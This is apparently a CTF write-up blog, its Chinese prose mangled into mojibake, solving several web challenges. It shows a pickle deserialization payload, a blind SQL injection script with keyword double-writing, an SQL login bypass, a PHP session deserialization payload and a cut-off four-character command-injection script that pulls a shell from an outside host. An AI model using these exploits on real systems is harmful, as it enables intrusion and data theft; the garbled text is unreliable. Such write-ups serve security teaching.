<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, render_template, request</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, category)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f'Animal(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.category!r&#125;</span>)'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> type(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">'__main__'</span>:</span><br><span class="line">            <span class="keyword">return</span> getattr(sys.modules[<span class="string">'__main__'</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(filename, encoding=<span class="string">'utf-8'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'r'</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">'source'</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(read(__file__), mimetype=<span class="string">'text/plain'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">'data'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b'R'</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = restricted_loads(base64.b64decode(pickle_data))</span><br><span class="line">                <span class="keyword">if</span> type(result) <span class="keyword">is</span> <span class="keyword">not</span> Animal:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">'Are you sure that is an animal???'</span></span><br><span class="line">            correct = (result == Animal(secret.name, secret.category))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'unpickle_result.html'</span>, result=result, pickle_data=pickle_data, giveflag=correct)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(repr(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Something wrong"</span></span><br><span class="line"></span><br><span class="line">    sample_obj = Animal(<span class="string">'ä¸€ç»™æˆ‘å“©giaogiao'</span>, <span class="string">'Giao'</span>)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'unpickle_page.html'</span>, sample_obj=sample_obj, pickle_data=pickle_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>æºç çš„æµç¨‹å¤§ä½“æ˜¯è¿™æ ·ï¼Œåªæœ‰ä¸€ä¸ªè·¯ç”±ï¼Œä¼šæŠŠæˆ‘ä»¬è¾“å…¥çš„dataï¼Œå…ˆbase64è§£ç ï¼Œç„¶åç¦æ­¢æˆ‘ä»¬è¾“å…¥Rï¼Œæˆ‘ä»¬åœ¨å¹³å¸¸é€šè¿‡pickleååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå¦‚æœæ‰§è¡Œå‘½ä»¤çš„è¯ï¼Œä¸€èˆ¬éƒ½ä¼šç”¨åˆ°<code>__reduce__</code>,ä»–åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šç”ŸæˆR.</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309114250845.png" alt="image-20200309114250845"></p>
<p>æ‰€ä»¥è¿™é‡Œä¸èƒ½ç”¨è¿™ä¸ªæ–¹æ³•äº†ï¼Œç»§ç»­çœ‹æºç ï¼Œå°†base64è§£ç åçš„æ•°æ®ååºåˆ—åŒ–ï¼Œè¿™é‡Œé‡å†™äº†find_class()å‡½æ•°</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309114949544.png" alt="image-20200309114949544"></p>
<p>é™åˆ¶äº†æˆ‘ä»¬ä½¿ç”¨çš„moduleåªèƒ½æ˜¯<code>__main__</code>,ç»§ç»­çœ‹æºç ï¼Œ</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309115124804.png" alt="image-20200309115124804"></p>
<p>å°†ååºåˆ—åŒ–çš„ç»“æœå’Œsecretæ¯”å¯¹ï¼Œå¦‚æœç›¸åŒå°±å¯ä»¥å¾—åˆ°flagã€‚è¿™é‡Œå‚è€ƒäº†å¤§å¸ˆå‚…çš„<a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener">æ–‡ç« </a>ï¼Œ</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309120952732.png" alt="image-20200309120952732"></p>
<p>æˆ‘ä»¬æŠŠä¸Šé¢çš„blueæ¢æˆsecret,å°±æ˜¯è§£æ³•äº†ï¼Œç„¶å</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools </span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, category)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f'Animal(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.category!r&#125;</span>)'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> type(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"></span><br><span class="line">x= Animal(<span class="string">"mount4in"</span>,<span class="string">"www"</span>)</span><br><span class="line">s= pickle.dumps(x)</span><br><span class="line"><span class="comment">#s= base64.b64decode("gANjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA1gUAAAA5LiA57uZ5oiR5ZOpZ2lhb2dpYW9xBFgIAAAAY2F0ZWdvcnlxBVgEAAAAR2lhb3EGdWIu")</span></span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=<span class="string">b'\x80\x03c__main__\nsecret\n&#125;(Vname\nVmount4in\nVcategory\nVwww\nub0c__main__\nAnimal\n)\x81&#125;(X\x04\x00\x00\x00nameq\x03X\x08\x00\x00\x00mount4inq\x04X\x08\x00\x00\x00categoryq\x05X\x03\x00\x00\x00wwwq\x06ub.'</span></span><br><span class="line">print(a)</span><br><span class="line">pickletools.dis(a)</span><br><span class="line">print(base64.b64encode(a))</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸç¯¡æ”¹ã€‚</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309125821513.png" alt="image-20200309125821513"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gANjX19tYWluX18Kc2VjcmV0Cn0oVm5hbWUKVm1vdW50NGluClZjYXRlZ29yeQpWd3d3CnViMGNfX21haW5fXwpBbmltYWwKKYF9KFgEAAAAbmFtZXEDWAgAAABtb3VudDRpbnEEWAgAAABjYXRlZ29yeXEFWAMAAAB3d3dxBnViLg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¾“å…¥å°±å¾—åˆ°flag</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309125431028.png" alt="image-20200309125431028"></p>
<h1 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h1><p>æ‰“å¼€ä¹‹åä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œå¯ä»¥æ³¨å†Œï¼Œä¸€å®šè¦å…»æˆä¹ æƒ¯æ€§å³é”®æŸ¥çœ‹æºä»£ç çš„ä¹ æƒ¯ã€‚</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309130212897.png" alt="image-20200309130212897"></p>
<p>å¯ä»¥çœ‹åˆ°éšè—äº†type,burpå‘åŒ…</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309130514215.png" alt="image-20200309130514215"></p>
<p>æ³¨å†ŒæˆåŠŸï¼Œç™»å½•è¿›å»çœ‹çœ‹æœ‰ä¸ªsearch.php,å¯ä»¥è¾“å…¥ï¼Œè¯•è¯•æ³¨å…¥</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309130823052.png" alt="image-20200309130823052"></p>
<p>æ˜æ˜¾å¾—æ³¨å…¥ï¼Œç„¶åå†™è„šæœ¬è·‘ï¼Œç«Ÿç„¶è·‘ä¸å‡ºæ¥æŠ¥é”™ï¼Œåæ¥åˆæµ‹å‡ºæ¥è¿‡æ»¤äº†select  fromï¼Œåªæ˜¯ç®€å•å¾—æ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™å°±å¯ä»¥ç»•è¿‡ã€‚</p>
<p>è´´ä¸Šexp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag= <span class="string">''</span></span><br><span class="line">url = <span class="string">'http://121.37.179.47:1001/search.php'</span></span><br><span class="line">Cookie = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'huiulsnkb5bpm59h6v38o1qlv1;'</span>,</span><br><span class="line">                    <span class="string">'username'</span>:<span class="string">'41fcba09f2bdcdf315ba4119dc7978dd'</span>&#125;</span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		payload=<span class="string">r"1' or 1=(ascii(mid((selselectect group_concat(column_NAME) frfromom information_schema.columnS where table_name='admin'),&#123;&#125;,1))&gt;&#123;&#125;)#"</span></span><br><span class="line">		payload=<span class="string">r"1' or 1=(ascii(mid((selselectect pwd frfromom admin limit 1),&#123;&#125;,1))&gt;&#123;&#125;)#"</span></span><br><span class="line">		url_1=url+payload.format(i,mid)</span><br><span class="line">		data=&#123;<span class="string">"flag"</span>:payload.format(i,mid)&#125;</span><br><span class="line">		r=requests.post(url,data=data,cookies=Cookie,proxies=proxies)</span><br><span class="line">		print(r.content)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">b"is flag"</span> <span class="keyword">in</span>  r.content:</span><br><span class="line">			low=mid+<span class="number">1</span> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	print(flag)</span><br><span class="line">	flag+=chr(mid)</span><br><span class="line"></span><br><span class="line"><span class="comment">#admin,fl4g,jd,user</span></span><br><span class="line"><span class="comment">#flag&#123;Rogue-MySql-Server-is-nday&#125;   number,submission_date,shifumoney  username,pwd,qq</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥æŸ¥å‡ºæœ‰åŠä¸ªflagã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309131731424.png" alt="image-20200309131731424"></p>
<p>ç„¶åçœ‹è¿™åŠä¸ªflagå¯ä»¥çŒœåˆ°è¦ç”¨Rogue-mysql-serveräº†ï¼Œä½†æ˜¯éœ€è¦æœ‰ä¸€ä¸ªè¿æ¥mysqlçš„åœ°æ–¹ï¼Œä¹‹åæ‰¾é‚£é‡Œå¯ä»¥è¿æ¥mysql,dirsearchçˆ†ç ´ç›®å½•</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309132145028.png" alt="image-20200309132145028"></p>
<p>æœ‰ä¸€ä¸ªadmin.html,åº”è¯¥æ˜¯åå°äº†ï¼Œéœ€è¦ç®¡ç†å‘˜çš„è´¦å·ï¼Œç„¶åå»æ•°æ®åº“é‡Œé¢æ³¨ï¼Œå¯ä»¥å¾—åˆ°adminçš„å¯†ç e2ecea8b80a96fb07f43a2f83c8b0960</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309131535198.png" alt="image-20200309131535198"></p>
<p>md5è§£å¯†åæ˜¯whoamiadmin</p>
<p>ç„¶åç™»è¿›å»<img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309132350796.png" alt="image-20200309132350796"></p>
<p>åˆšåˆšå¥½ï¼Œvpsä¸Šè¿è¡Œrogue-mysql-server,è¯»æœåŠ¡å™¨æ–‡ä»¶</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309132653295.png" alt="image-20200309132653295"></p>
<p>æ¯”è¾ƒè€ƒéªŒçœ¼åŠ›</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309132919770.png" alt="image-20200309132919770"></p>
<p>ä¸¤ä¸ªä¸€æ‹¼ä¸Šå°±æ¬§å…‹äº†ã€‚</p>
<h1 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h1><p>è€ƒç‚¹ ï¼šsql</p>
<p>è¿™æ˜¯ä¸ª<a href="https://gksec.com/HNCTF2019-Final.html" target="_blank" rel="noopener">åŸé¢˜</a>ï¼Œç›´æ¥æœå°±å‡ºæ¥äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=sqlsql;charset=utf8;'</span>, <span class="string">'xxx'</span>, <span class="string">'xxx'</span>);</span><br><span class="line">    $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);</span><br><span class="line">    $stmt = $pdo-&gt;prepare(<span class="string">"SELECT username from users where username='$&#123;_POST['username']&#125;' and password='$&#123;_POST['password']&#125;'"</span>);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $result = $stmt-&gt;fetchAll();</span><br><span class="line">    <span class="keyword">if</span> (count($result) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($result[<span class="number">0</span>][<span class="string">'username'</span>] == <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">    <span class="comment">// ....</span></span><br></pre></td></tr></table></figure>

<p>ç»•è¿‡ç™»å½•å°±å¯ä»¥ï¼Œå°è¯•ä¸‡èƒ½å¯†ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from products where name&#x3D;&#39;a&#39;-0 -&#39;&#39;;</span><br><span class="line">+----------+-----------------------------------+-------------+</span><br><span class="line">| name     | secret                            | description |</span><br><span class="line">+----------+-----------------------------------+-------------+</span><br><span class="line">| facebook | ddddddddddddddddddddddddddddddddd | flag        |</span><br><span class="line">| facebook | fdddddddddddddddddddddddddddddddd | azzz        |</span><br><span class="line">+----------+-----------------------------------+-------------+</span><br><span class="line">2 rows in set, 3 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from products;</span><br><span class="line">+----------+-----------------------------------+-------------+</span><br><span class="line">| name     | secret                            | description |</span><br><span class="line">+----------+-----------------------------------+-------------+</span><br><span class="line">| facebook | ddddddddddddddddddddddddddddddddd | flag        |</span><br><span class="line">| facebook | fdddddddddddddddddddddddddddddddd | azzz        |</span><br><span class="line">+----------+-----------------------------------+-------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ä¸Šé¢è¿™ç§å½¢å¼ç»•è¿‡ã€‚</p>
<p>å¯†ç ï¼šâ€˜-0-â€™</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309134804035.png" alt="image-20200309134804035"></p>
<h1 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h1><p><strong>è€ƒç‚¹</strong>: sessionååºåˆ—åŒ–  å››ä½å­—ç¬¦å‘½ä»¤æ‰§è¡Œå†™shell</p>
<p>é¢˜ç›®ç»™äº†æºç ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//profile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'lib.php'</span>;</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°è¿™é‡Œè®¾ç½®äº†session.serialize_handlerä¸ºphp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php  é”®å ç«–çº¿ serializeåçš„å†…å®¹</span><br><span class="line">php_serilaize   serilizeåçš„å†…å®¹</span><br><span class="line">php_binary  é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>å½¢æˆåŸç†æ˜¯åœ¨ç”¨session.serialize_handler = php_serializeå­˜å‚¨çš„å­—ç¬¦å¯ä»¥å¼•å…¥ | , å†ç”¨session.serialize_handler = phpæ ¼å¼å–å‡º$_SESSIONçš„å€¼æ—¶ â€œ|â€ä¼šè¢«å½“æˆé”®å€¼å¯¹çš„åˆ†éš”ç¬¦</strong></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'lib.php'</span>;</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">    <span class="keyword">public</span> $sign;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = $_SESSION[<span class="string">'admin'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sign = $_SESSION[<span class="string">'sign'</span>];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sign;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;admin === <span class="number">1</span>) &#123;</span><br><span class="line">            redirect(<span class="string">'./core/index.php'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> info();</span><br><span class="line">$a-&gt;admin=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:4:"info":2:&#123;s:5:"admin";i:1;s:4:"sign";N;&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åç™»å½•ï¼Œè®¾ç½®signä¸º</p>
<p><code>|O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;N;}</code></p>
<p>å°±å¯ä»¥çœ‹åˆ°</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309145414327.png" alt="image-20200309145414327"></p>
<p>è¿™é‡Œå‰åŠéƒ¨åˆ†æ˜¯æ”¹çš„bytectfçš„boringcodeï¼ŒæŠŠbaidu.comæ”¹æˆäº†127.0.0.1.</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309145802597.png" alt="image-20200309145802597"></p>
<p><a href="https://blog.csdn.net/a3320315/article/details/102989485" target="_blank" rel="noopener">å‚è€ƒ</a></p>
<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨compress.zlib://data:@127.0.0.1/plain;ç»•è¿‡</p>
<p>ç„¶åååŠéƒ¨åˆ†æ˜¯å››ä½å­—ç¬¦å†™shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">target = <span class="string">'http://121.36.222.22:88/'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># å­˜æ”¾å¾…ä¸‹è½½æ–‡ä»¶çš„å…¬ç½‘ä¸»æœºçš„IP</span></span><br><span class="line">shell_ip = <span class="string">'144.34.200.151'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># æœ¬æœºIP</span></span><br><span class="line"><span class="comment">#your_ip = r.get('http://ipv4.icanhazip.com/').text.strip()</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># å°†shell_IPè½¬æ¢æˆåå…­è¿›åˆ¶</span></span><br><span class="line">ip = <span class="string">'0x'</span> + <span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> shell_ip.split(<span class="string">'.'</span>)])</span><br><span class="line"> </span><br><span class="line">reset = target + <span class="string">'core/clear.php'</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="comment"># payloadæŸäº›ä½ç½®çš„å¯é€‰å­—ç¬¦</span></span><br><span class="line">pos0 = random.choice(<span class="string">'efgh'</span>)</span><br><span class="line">pos1 = random.choice(<span class="string">'hkpq'</span>)</span><br><span class="line">pos2 = <span 